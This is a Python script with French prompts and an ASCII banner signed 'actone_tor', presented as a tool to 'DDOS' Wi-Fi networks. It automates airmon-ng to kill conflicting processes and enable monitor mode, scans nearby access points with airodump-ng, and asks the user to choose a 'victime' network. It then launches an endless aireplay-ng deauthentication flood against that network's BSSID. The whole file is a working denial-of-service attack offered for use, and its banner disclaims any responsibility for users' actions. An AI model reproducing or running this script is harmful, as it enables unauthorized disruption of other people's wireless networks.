import subprocess

import re

import csv

import os

import time

import shutil

from datetime import datetime


active_wireless_networks = []


def check_for_essid(essid, lst):
    check_status = True

    
    if len(lst) == 0:
        return check_status

   
    for item in lst:
       
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print("DDOS WIFI PAR MAC ADRESSE ET AIRMON-NG") 
print("")
print("")
print("")
print("JE NE SUIS EN AUCUN CAS RESPONSABLE DE VOS ACTES!!!!")
print("")
print("")
print("")
print("                                                                                       __       _____________   _______          ______                   ")
print("|          |            /\               |       /        O     |\          |         /               |        /       \        /      \       |          ")
print("|          |           /  \              |      /               | \         |        /                |       /         \      /        \      |          ")
print("|          |          /    \             |     /          |     |  \        |       /                 |      /           \    /          \     |          ")
print("|          |         /      \            |    /           |     |   \       |       |                 |     |             |  |            |    |          ")
print("|          |        /--------\           |   /            |     |    \      |       |                 |     |             |  |            |    |          ")
print("|----------|       /          \          |   \            |     |     \     |       |     ______      |     |             |  |            |    |          ")
print("|          |      /            \         |    \           |     |      \    |       |          |      |     |             |  |            |    |          ")
print("|          |     /              \        |     \          |     |       \   |       |          |      |     |             |  |            |    |          ")
print("|          |    /                \       |      \         |     |        \  |        \         |      |      \           /    \          /     |          ")
print("|          |   /                  \      |       \        |     |         \ |         \        |      |       \         /      \        /      |          ")
print("|          |  /                    \     |        \       |     |          \|          \_______|      |        \_______/        \______/       |__________")
print("")
print("                                                                                                                                            par actone_tor")
print("")
print("")
print("")
print("") 
print("ACTONE_TOR   &&   HACKINGTOOL")
print("\n****************************************************************")
print("\n*  ACTONE_TOR, 2021                                            *")
print("\n*  TIKTOK:actone_tor                                           *")
print("\n*  INSTAGRAM:Tor                                               *")
print("\n****************************************************************")




if not 'SUDO_UID' in os.environ.keys():
    print("utilise un sudo pour avoir les permition")
    exit()


for file_name in os.listdir():
     
    
        
    if ".csv" in file_name:
        
        directory = os.getcwd()
        try:
            
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        
        timestamp = datetime.now()
        
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")






check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())


if len(check_wifi_result) == 0:
    print("connecter vous au wifi encore une fois.")
    exit()


print("séléctionner interface réseau:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")


while True:
    wifi_interface_choice = input("connecter votre interface réseau pour continuer l'attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Entrer le nombre de votre réseau:")


hacknic = check_wifi_result[int(wifi_interface_choice)]


print("adapteur wifi connecter!\nKill des réseau:")


kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])


print("choisis ton wifi victime:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])


discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv",hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 


try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # We should only have one csv file as we backup all previous csv files from the folder every time we run the pro>
                # The following list contains the field names for the csv entries.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # This will run multiple times and we need to reset the cursor to the beginning of the file.
                        csv_h.seek(0)
                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with>
                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                              pass
                            # We are not interested in the client data.
                            elif row["BSSID"] == "Station MAC":
                                  break
                               # Every field where an ESSID is specified will be added to the list.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning.Apuyer sur Ctrl+C pour selectionner votre réseau a attacker\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
      
        time.sleep(1)

except KeyboardInterrupt:
    print("\nchoisie ton réseau.")


while True:
   
    choice = input("selectione ton réseau pour l'attack: ")
    try:
        if active_wireless_networks[int(choice)]:
                            break
    except:
        print("Réessaie encore une fois.")


hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])


subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])




